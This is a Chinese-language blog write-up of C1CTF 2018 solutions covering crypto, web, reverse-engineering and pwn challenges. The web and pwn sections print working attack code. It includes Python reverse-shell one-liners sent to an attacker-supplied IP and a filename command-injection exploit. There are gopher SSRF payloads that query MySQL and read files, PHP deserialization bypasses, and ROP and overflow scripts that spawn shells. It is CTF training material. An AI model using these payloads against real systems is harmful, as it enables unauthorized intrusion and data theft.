---
title: "C1CTF 2018 Writeup"
date: 2018-12-12 21:57:13
tags: [c1ctf, writeup]
---

Misc
----

### 0x01 签到

base64 解码一下就行, 不懂的同学可以看一下[这个](https://www.rmb122.cn/index.php/2018/04/26/base64-%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/)

```
$ base64 -d                                     
QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9
C1CTF{w3lec0me_tO_C1CTF}
```

<!--more-->

### 0x02 find the flag~

这道题我应该是非预期了 233 我用的是

```sh
$ scp -P 8999 -r ssh_bash@212.64.85.131:/home/ssh_bash/ .
```

直接把整个文件夹给下下来了, 正确做法应该是尝试几个常用命令可以发现有 python, 然后直接用 os.system 就 OK 了

```python
>>> import os
>>> os.system('/bin/ls /home/ssh_bash/')
bin  c5836008c1649301e29351a55db8f65c
0
>>> os.system('/bin/cat c5836008c1649301e29351a55db8f65c')
C1CTF{Bash_l1mit3d}
0
```

### 0x03 cats and dogs

脑洞一下可以想到出题人把二维码中的黑的像素换成狗的图片, 把白的像素换成喵咪的图片. binwalk 出来的 mysql 文件应该是意外...

图片大小 17400x17400, 可以靠神经网络来识别内容, 当然你也可以靠人工来识别, 如果你有足够耐心的话... 

先靠 PIL 把图像给切割了, 如果因为图像太大, 遇到 DecompressionBombError, 可以把 PIL 源码改成 pass 就可以了, 报错是不可能报错的, 这辈子都不可能报错的

![](https://i.loli.net/2019/03/08/5c826d05ce0aa.png)

```python
from PIL import Image

img = Image.open('cat&dog.jpg')
#region = (0, 0, 200, 200)
# (x0,y0,x1,y1)
num = 0
for y in range(87):
    for x in range(87):
        tmp = (0 + x * 200, 0 + y * 200, 200 + x * 200, 200 + y * 200)
        part = img.crop(tmp)
        part.save(f'pics/{num}.png')
        num += 1
```

切割完成后考虑的就是识别的问题了. HINT 给了数据集, 可以在 Github 上找现成的, 中间试了好几个模型, 最后找到[这个](https://github.com/mrgloom/kaggle-dogs-vs-cats-solution), 是 google 之类拿来发论文的模型, 准确率不知道比个人训练的好到哪里去了. 我自己用的 linux, 装起环境来还挺方便, 这里一键装个 Caffe 就行了. 然后改一下示例代码. 用了 SqeezeNet_v1.1 的模型, 然后开跑就 ok

```python
import os
import sys
import shutil
import numpy as np

import usefull_utils

#Iterate over all data and get prediction errors

os.environ['GLOG_minloglevel'] = '2' 

import caffe

'''if len(sys.argv) != 6:
    print "Usage: python get_predition_errors.py deploy.prototxt model.caffemodel mean.npy <cat_data_folder> <dog_data_folder>"
    sys.exit()'''
    
DEPLOY_PROTOTXT = 'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/deploy.prototxt' #deploy.prototxt
CAFFE_MODEL = 'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/model.caffemodel'#model.caffemodel
MEAN_FILE = 'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/mean.npy' #mean.npy
MODEL_POSTFIX= CAFFE_MODEL.split(os.sep)[-2] # not safe way
'''CAT_DATA_FOLDER= sys.argv[4]
DOG_DATA_FOLDER= sys.argv[5]'''

print("MODEL_POSTFIX", MODEL_POSTFIX)

#caffe.set_mode_gpu()
net = caffe.Classifier(DEPLOY_PROTOTXT, CAFFE_MODEL,
                       mean=np.load(MEAN_FILE).mean(1).mean(1),
                       channel_swap=(2,1,0),
                       raw_scale=255,
                       image_dims=(256, 256))

from PIL import Image
img = Image.new("L", (87, 87), 255)
col = 0
row = 0
for i in range(7569):
    prediction = net.predict([caffe.io.load_image('pics/' + str(i) + '.png')])
    print(i, prediction[0].argmax())
    if (prediction[0].argmax() == 1):
        img.putpixel((col, row), 0)
    col += 1
    if col == 87:
        img.show()
        row += 1
        col = 0
img.save('out.png')
```

![](https://i.loli.net/2019/03/08/5c826d603e3ac.png)

然后你就可以得到这个~

扫一下得到 C1CTF{Do_u_lik3_An1mals?}

### 0x04 easy_crypto

1 和 2 比较相似, 就一起说了, 两题都是 RC4, 因为是对称加密, 所以对于第一题 easy_crypto1 只要翻译过来就行了, 我就在网上找了个现成的

```python
def crypt(data, key):
    """RC4 algorithm"""
    x = 0
    box = [i for i in range(256)]
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(char ^ box[(box[x] + box[y]%256) % 256]))

    return ''.join(out)

data = open('easy_enc.txt', 'rb').read()
key = 'hello world'
data = data.replace("\r".encode(), "".encode())
data = crypt(data, key)
print(data)
# C1ctf{5ca4a10ca6de1639674a822cc93c81fb}
```

注意 data.replace("\r".encode(), "".encode()), 出题人用的 windows 保存的时候忘了用 wb 模式了, 所以把 CRLF 给一起保存进去了, 所以 \r 会乱码, 把 \r 替换掉就 ok

第二题, 出题人把 key 加密了一下, 我们取一段来看看 `_____*((__//__+___+______-____%____)**` 可以猜出来 _ 的数量对应数字, 这整个 key 其实是个表达式. 写个脚本解密一下

```python
import base64
key = "_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)\*__+_)\*\*_________+_______*(((_________%_______)\*__+_______-(________//________))\*\*_______)+(________/__)*(((____-_+_______)*(______+____))\*\*___)+___\*((__+_________-_)\*\*_____)+___\*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))\*\*__)+(_//_)\*(((________%___%__+_____+_____)%______)+_______-_)\*\*___+_____\*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___"
for i in range(100, 0, -1):
    key = key.replace("_" * i, str(i))
print(key)
key = int(eval(key))
print(key)
key = hex(key)
print(base64.b16decode(key[2:].upper()))

$ python2 crypto1/rep.py # 注意这里得用 python2, 3的话会自动转浮点, 精度会丢失
5((2//2+3+6-4%4)((3%(3-1))+8+(3%3+5+7%2+6-(6//(5%3)))))+2(((8/2)+3%2+7-(8//4))(1(5+5)+7+9%3))+8(((9//2+8%2)+(7-1))((3+7)+9-(6//2)))+7((3+9-(6//3-7%2%1))(5+5+5))+2(2+9-(3//3-9%5%2))(9-4+7)+(3+7)(8%3%2+5+6)+(5-2)((4//4-5%4%1)+9)(5-(7//7+9%3)+6)+(5+(9%7)2+1)9+7(((9%7)2+7-(8//8))7)+(8/2)(((4-1+7)(6+4))3)+3((2+9-1)5)+3(((3+7-6/3+2-9%5%2)(3-1+8/2+9%5))2)+(1//1)(((8%3%2+5+5)%6)+7-1)*3+5((6/(5%3))+7)((9%7)2+5+1)+3//3+9+9/3
5287002131074331513
I_4m-k3y
```

I_4m-k3y 就是 key 了, 然后又找到一个现成的脚本, 解密一下

```python
def crypt(data, key):
    """RC4 algorithm"""
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))

    return ''.join(out)

def tencode(data, key, encode=base64.b64encode, salt_length=16):
    """RC4 encryption with random salt and final encoding"""
    salt = ''
    for n in range(salt_length):
        salt += chr(random.randrange(256))
    data = salt + crypt(data, sha1(key + salt).digest())
    if encode:
        data = encode(data)
    return data

def tdecode(data, key, decode=base64.b64decode, salt_length=16):
    """RC4 decryption of encoded data"""
    if decode:
        data = decode(data)
    salt = data[:salt_length]
    return crypt(data[salt_length:], sha1(key + salt).digest())

print tdecode(strCipher, key)
# C1ctf{5f601e8cc1bde1f1a54e336158ba766d}
```

Web
---

### 0x01 resize your image

vulhub [原题](https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2018-16509), payload 改一下  

`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('Your IP',Your Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`

```python
$ nc -lvvp 19132
Listening on [0.0.0.0] (family 0, port 19132)
Connection from 212.64.85.131 40172 received!
/bin/sh: 0: can't access tty; job control turned off
# ls
app.py
flag
# cat flag
C1CTF{hello_world}
```

### 0x02 web签到

改一下 cookie 就行, 我用的是 [EditThisCookie](https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg)

![](https://i.loli.net/2019/03/08/5c826dfb50be6.png)  

![](https://i.loli.net/2019/03/08/5c826e11a3277.png)  

### 0x03 php是世界上最好的语言  

在 http://212.64.85.131/robots.txt 可以找到提示, `Disallow: /flag.zip`, 下下来就可以得到源码, 接下来就是源码审计

1. `($a == $b) + (md5($a) != sha1($b))` 这个很好绕, 传两个值不一样的数组就可以绕过, 比如 `a[1]=1&b[1]=2`. 原理是 md5 和 sha1 对 数组会返回 NULL

```php
php > var_dump(md5(array()));
PHP Warning:  md5() expects parameter 1 to be string, array given in php shell code on line 1

Warning: md5() expects parameter 1 to be string, array given in php shell code on line 1
NULL
```

2.`$token['user'] == "????????" && $token['pass'] == "????????"` 我竟然以为真的要想办法绕过... 后来试了下居然真的只要让 `user=????????` 就行了233

3.`$flag->middle === $flag->left && $flag->middle === $flag->right` 这个绕过第一感觉是不可能, 除非能有像 C++ 那样的引用, 然后百度了一下... 居然真的有这种骚东西 还真的可以序列化 233

如果反序列化这方面有问题的话可以百度一下对应的教程

整合一下得到 payload `curl "http://212.64.85.131/?mode=begin&a[1]=1&b[1]=2" -d 'token=a:2:{s:4:"user";s:8:"????????";s:4:"pass";s:8:"????????";}&flag=O:9:"last_task":3:{s:4:"left";N;s:6:"middle";R:2;s:5:"right";R:2;}'`

得到 this is your flag C1ctf{Php\_1s\_best\_language\_in\_the_world}  

### 0x04 今年还有小姐姐

fuzz 一下 file:// 被过滤了, 然后看了下 HINT. 发现在 info.php 左下角非常猥琐的藏着 sql 语句...

![](https://i.loli.net/2019/03/08/5c826e702af72.png)

基本上可以确定是 gopher + ssrf 了

让他访问 http://127.0.0.1:3306 也确实可以得到 mysql 的 banner

![](https://i.loli.net/2019/03/08/5c826e89d5c9b.png)

具体原理可以看[这里](https://www.freebuf.com/articles/web/159342.html), 简单来说 gopher 协议可以将任意内容通过 tcp 发送, 而 mysql 在空密码时握手包的内容是固定的, 我们就可以通过 gopher 来读取数据库中的内容

这里可以通过在本地搭一个空密码的 root 账号的 mysql 加上 wireshark 来重放一遍客户端发送的数据, 得到服务器上数据库的应答

这里可以用 -e 选项来直接执行命令. 通过提示里的表结构可以构造如下语句

```sh
mysql -u root -e "SELECT path FROM ctf.flag" -h127.0.0.1
```

然后在 wireshark 里面导出以后用 urlencode 一下加在 gopher://127.0.0.1:3306/A 后面(注意A留着, 不能删), 这里我的 payload 是 

`gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520083%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql%1A%00%00%00%03SELECT%20path%20FROM%20ctf.flag%01%00%00%00%01`

![](https://i.loli.net/2019/03/08/5c826ec9b4061.png)

`/var/lib/mysql-files/flag.txt` 即是路径, 再通过 load_file 来读取它

```sh
mysql -u root -e "SELECT load_file('/var/lib/mysql-files/flag.txt')" -h127.0.0.1
```

得到 payload 

`gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_file%28%27/var/lib/mysql-files/flag.txt%27%29%01%00%00%00%01`

然后你会得到... 

![](https://i.loli.net/2019/03/08/5c826ef30a8bd.png)

太真实了, 再 fuzz 一下, 发现过滤了 file 和 - 字符, 直接 urlencode 一下就可以 bypass, 得到新的 payload 

`gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_%66ile%28%27/var/lib/mysql%2dfiles/flag.txt%27%29%01%00%00%00%01`

![](https://i.loli.net/2019/03/08/5c826f0a88582.png)

得到 flag{gopher\_make\_mysql\_happy}

### 0x05 eeeee

考察点: Django目录穿越,命令执行bypass

入口点: http://212.64.89.186/booksystem/static/  
访问之后是500,在后面输入内容显示文件不存在, 所以这里可以判断出是存在文件读取的：  
http://212.64.89.186/booksystem/static/..%2f..%2fpass.txt  
后台逻辑为:

```python
def do_GET(request,filename):
    full_path = os.path.join('static', filename)
    #print(full_path)
    if not os.path.exists(full_path):
        return HttpResponseNotFound('<h1>file not found<h1>')
    else:
        if(filename[-3:]=="css"):
            response = HttpResponse(read_file(full_path))
            response['Content-Type'] = 'text/css'
            response['Content-Length'] = os.path.getsize(full_path)
            #response['Content-Disposition'] = 'attachment; filename=%s' % filename
            response['Accept-Ranges'] = 'bytes'
            return response
        elif(filename[-3:]=="svg"):
            response = HttpResponse(read_file(full_path))
            response['Content-Type'] = 'image/svg+xml'
            response['Content-Length'] = os.path.getsize(full_path)
            #response['Content-Disposition'] = 'attachment; filename=%s' % filename
            response['Accept-Ranges'] = 'bytes'
            return response
        else:
            response = HttpResponse(read_file(full_path))
            response['Content-Type'] = 'text/html'
            response['Content-Length'] = os.path.getsize(full_path)
            #response['Content-Disposition'] = 'attachment; filename=%s' % filename
            response['Accept-Ranges'] = 'bytes'
            return response   
def read_file(filename):
    try:
        with open(filename, 'rb') as f:
            content = f.read()
            yield content
        f.close()
    except Exception as e:
        print(e.message)
        print('read error')
```

可以读取到admin的用户名和密码,然后进行登录: admin:this_is_admin_password

使用admin登录之后可以看到上传文件的地方,因为是python写的, 所以不太确定能不能上传webshell, 然后使用之前的任意文件读取读源码, 看实现逻辑:  
http://212.64.89.186/booksystem/static/..%2fbooksystem/views.py  
实现逻辑:

```python
def Do_upload(request): #文件上传, 格式转换
    black_list = ['`',';','&','|',"PS",'>',"<"]
    #return HttpResponse(os.path)
    if request.method == 'POST':
        ret = {'status': False, 'data': None, 'error': None}
        user = request.POST.get('user')
        img = request.FILES.get('img')
        for i in black_list:
            if i in img.name:
                return HttpResponse("你是魔鬼吗？")
        f = open(os.path.join('upfile', img.name), 'wb')
        #return HttpResponse(os.path)
        for chunk in img.chunks(chunk_size=1024):
            if b"%!PS" in chunk:
                 return HttpResponse("你是个大魔鬼！")
            f.write(chunk)
        f.close()
        ret['status'] = True
        ret['data'] = os.path.join('upfile', 'smaller_'+img.name)
        command = "convert -resize 200x100 \`pwd\`/upfile/"+img.name+"  \`pwd\`/upfile/smaller_"+img.name+";rm \`pwd\`/upfile/"+img.name
        #os.system("echo "+command+"> /tmp/123")
        os.system(command)
        return HttpResponse(json.dumps(ret))
        # except Exception as e:
        #     ret['error'] = e
        # finally:
        #     f.close()
        #     return HttpResponse(json.dumps(ret))
    else:
        return HttpResponse('')
```

本意是利用imagemagic的洞getshell的, 但是我太懒了, 没有换服务器里面的版本, 所以就只能用文件名导致的命令注入了, 这里有个坑, nginx会把 "/" 后面的作为文件名解析, 所以需要绕过 "/", exp:

```python
import requests

files = {
    "img": ("asd\npython -c \"import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('Your_ip',19132))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([chr(47)+'bin'+chr(47)+'sh','-i'])\"", "asd")
}

res = requests.post("http://212.64.89.186/upload/", files=files)
print(res.text)
```

```
$ nc -lvvp 19132
Listening on [0.0.0.0] (family 0, port 19132)
Connection from 212.64.89.186 38538 received!
/bin/sh: 0: can't access tty; job control turned off
$ ls
FlightTicket
a.txt
aaab.txt
article.db
booksystem
flightdb.sqlite3
index.html
index.html.1
index.html.2
manage.py
nohup.out
pass.txt
requirements.txt
static
templates
testdb.py
upfile
$ cat ~/Flaaa44444AAAAAAGGGGGG
flag{Django_is_Very_Interesting}
```

### 0x06 baby exec

代码如下:

```php
<?php
ini_set("display_errors", 0);
error_reporting(E_ALL ^ E_NOTICE);
error_reporting(E_ALL ^ E_WARNING);
include('config.php');
$v1 = ['admin','test'];
$v2 = $_POST['v2'];
$number = 1;
$v5=0;
if($v2 === $v1 & $v2[0] != 'admin'){//There you can execute the command
    
    $v3 = $_GET['v3'];
    $v4 = $_GET;
    foreach($v4 as $key => $cmd){
        if($key == $system_function){
            $v5 = 1;
        }
if($v5 && strlen($v3)>11 && $number == 3){
            $system_function($cmd,$key); 
        }
        $number++;
    }
}else{    
    echo "sorry";
}
highlight_file('hhhhhhhhhhhhhhhh_exec.php');
```

一步一步看代码, 一眼看是不可能进行利用的, 在 `if($v2 === $v1 & $v2[0] != 'admin')` 常理是不可能绕过的, 但是看一下php版本, 也是前两天看youtube看到了这一个技巧, 在php5.5.9中会产生int溢出, 2^32 = 4294967296 会解析成0, 这样就可以绕过这一步.   
POST输入v4, GET输入v3, 并且v3要比11个字符要长. 

```php
if($key == $system_function){
    $v5 = 1;
}
```

双等于号用弱类型就可以绕过.   
比如：

```php
<?php
$a = "asdsadsad";
$b = 0;
echo $a==$b;
```

这时就会输出1.  
v5,$v3就已经满足了, 只需要将命令作为第三组就可以执行命令, 最后payload：  
`curl "http://212.64.89.186:9992/hhhhhhhhhhhhhhhh_exec.php/hhhhhhhhhhhhhhhh_exec.php?v3=aaaaaaaaaaaaaaaaaaaaa&0=asd&system=cat%20index.php" -d "v2[4294967296]=admin&v2[1]=test"`

得到 flag{PhP\_1S\_Best\_Lang}

Reserve
-------

### 0x01 iOS13

改一下版本号安装到 iPhone 上, 不过, 我没有 iOS 设备啊, 那就....

把整个 ipa 拖入 ida 内,最后发现 `iOS13` 内有 `C1CTF&#123;%s&#125;`, 而 iOS13dyn 内有剩下的 flag

可以看到 0 是参数, 所以 %d 应该用 0 替代. 

### 0x02 Captcha

如果当成 Misc 来做的话可以直接用CE修改, 改成只需要输入 1 个验证码就可以结束

### 0x03 Adjacent

注意反编译后的这一条语句:

```cpp
if (((unsigned __int8)s[i + 1] ^ (unsigned __int8)s[i]) != *(&v5 + i))
```

实际上就是把字符串中相邻两个字节进行异或, 前面的结果进行比较, 我们知道flag开头是 `C1CTF{xxxx}`

就算不知道是 C 开头, 也知道是 `}` 结尾

```cpp
unsigned char flag2[31] = { 0x72,0x72,0x17,0x12,0x3d,0x23,0x68,0x42,0x2d,0x1e,0x25,0x0e,0x0b,0x22,0x70,0x5d,0x1a,0x2b,0x3c,0x2b,0x29,0x13,0x2d,0x66,0x0f,0x62,0x2d,0x2a,0x29,0x13,0x14 };
unsigned char flag[33] = { 'C' };
for (int i = 1; i < 32; i++) {
    flag[i] = flag2[i-1] ^ flag[i - 1];
}
//"C1CTF{X0r_AdjaC3nt_cHar_96TySzi}"	
```

### 0x04 encoding

这道题可以爆破, 爆破的方法就不在此说了. 

第一部分是异或

第二步可以从 `sub_7FA` 得到这样的置换表：

`nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ`

然后

```cpp
_BYTE \*__fastcall sub_A84(__int64 a1, _BYTE \*a2)
{
  _BYTE *result; // rax
  _BYTE *v3; // [rsp+0h] [rbp-20h]
  char v4; // [rsp+19h] [rbp-7h]
  unsigned __int8 v5; // [rsp+1Ah] [rbp-6h]
  unsigned __int8 i; // [rsp+1Bh] [rbp-5h]
  int v7; // [rsp+1Ch] [rbp-4h]

  v3 = a2;
  v4 = 0;
  v5 = 0;
  v7 = 0;
  while ( *(_BYTE *)(v7 + a1) )
  {
    \*v3++ = sub_7FA((unsigned __int8)((int)\*(unsigned __int8 *)(v7 + a1) >> (v5 + 2)) | v4); //舍弃 v7中的v5+2位
    v5 = (v5 + 2) & 7;   // mod 8 剩余位数
    v4 = 0;
    for ( i = 0; i < v5; ++i )
      v4 |= ((1 << i) & *(unsigned __int8 *)(v7 + a1)) << (6 - v5);   //取出v7中剩余的位数, v5位
    if ( v5 <= 5u ) // 不足五位向前取一位
      ++v7;
  }
  result = v3;
  *v3 = 0;
  return result;
}
```

看出这是base64, 反向编码

```python
#!/usr/bin/env python3

t = 'nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ'
s = 'KFjUWyZ592NvPU1CCa5xAIRVAa4CTEN6+bjwWlqm'
a = ''
flag = ''
for ch in s:
    i = t.find(ch)
    a += '{0:0>6b}'.format(i)

for i in range(0,len(a),8):
    if i/8 % 2 == 0:
        flag += chr(int(a[i:i+8],base=2) ^ 0xF9 )
    else:
        flag += chr(int(a[i:i+8],base=2) ^ 0xA4 )

print(flag)
#C1CTF{th1s_Bas364_is_BuD9ApUy}
```

### 0x05 Activate

UTF16编码：

`激活码无效` -> `C0 6F 3B 6D 01 78 E0 65 48 65`

找到激活码无效这一字符串前面的分支, 下个断点

走红线 “激活完成”

Pwn
---

### 0x01 Chekin

这其实算密码学题目吧....   

```python
#!/usr/bin/env python3
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("your ip address",9990))

payload = b'2'+b'\n'
sock.sendall(payload)
payload = b'10'+b'\n'
sock.sendall(payload)
payload = b'3544388184383369539\n'
sock.sendall(payload)
print(sock.recv(100))

payload = b'2'+b'\n'
sock.sendall(payload)
payload = b'11'+b'\n'
sock.sendall(payload)
payload = b'56\n'
sock.sendall(payload)
print(sock.recv(100))

payload = b'0'+b'\n'
sock.sendall(payload)
print(sock.recv(100))
print(sock.recv(100))
print(sock.recv(100))
```

### 0x02 Windows

主要是调用 `00402360` 处的后门

```python
#!/usr/bin/env python3

import socket  
import time

      
def pwn():  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect(("your ip address",9990))  
    time.sleep(0.5)
    print(s.recv(1024))
    # 选择写入内容
    payload = b'1'
    # 向服务器发送数据  
    s.sendall((payload + b'\n'))
    time.sleep(0.5)
    print(s.recv(2048))
    # 写入字符串%p
    payload = b'%p'
    
    s.sendall((payload + b'\n'))
    time.sleep(0.5)
    print(s.recv(1024))
    # 读取地址%p
    payload = b'2'
    s.sendall((payload + b'\n'))
    time.sleep(0.5)
    #'Here is your string:\r\n00D72230'
    r = s.recv(1024).decode('gbk')
    print(r)
    # 选择写入
    payload = b'1'
    s.sendall((payload + b'\n'))
    time.sleep(0.5)
    
    print(s.recv(1024).decode('gbk'))
    # 写入Payload 覆盖返回值, 获取shell
    payload = b'A'*20+(int(r[-8:],base=16)+176).to_bytes(4,'little')
    s.sendall((payload + b'\n'))
    time.sleep(0.5)
    print(s.recv(1024).decode('gbk'))


    payload = b'type flag.txt'
    s.sendall((payload + b'\n'))
    time.sleep(0.5)
    print(s.recv(2048).decode('gbk'))

    s.close()


pwn()
```

### 0x03 upgrade

直接看脚本的注释或者看线下的解释吧...  

```python
#!/usr/bin/env python
from pwn import *

p = process("./pwn2")


p.send('1\n')
print(p.recv())
p.send('15\n')
#print(p.recv())
t = p.recv()
print(t)
libc_main_ret = [int(s) for s in t.split() if s.isdigit()][0]
print(libc_main_ret)

libc_main_base = libc_main_ret - 0x021B97

libc_pop_rdi = libc_main_base + 0x02155f 
libc_pop_rdx_rsi = libc_main_base + 0x01306d9

libc_bin_sh = libc_main_base + 0x01b3e9a
libc_int_80 = libc_main_base + 0x01b3e9a
libc_execve =  libc_main_base + 0xE4E30


#0x000000000002155f : pop rdi ; ret A
#0x0000000000023e6a : pop rsi ; ret B
#0x0000000000001b96 : pop rdx ; ret C
#0x000000000003eb0b : pop rcx ; ret D
#0x00000000001306d9 : pop rdx ; pop rsi ; ret

p.send('2\n15\n')
p.send(str(libc_pop_rdi)+'\n')
print(p.recv())

p.send('2\n16\n')
p.send(str(libc_bin_sh)+'\n')
print(p.recv())

p.send('2\n17\n')
p.send(str(libc_pop_rdx_rsi)+'\n')
print(p.recv())

p.send('2\n18\n')
p.send('0\n')
print(p.recv())

p.send('2\n19\n')
p.send('0\n')
print(p.recv())

p.send('2\n20\n')
p.send(str(libc_execve)+'\n')
print(p.recv())

p.send('0\n')
print(p.recv())

p.interactive()
```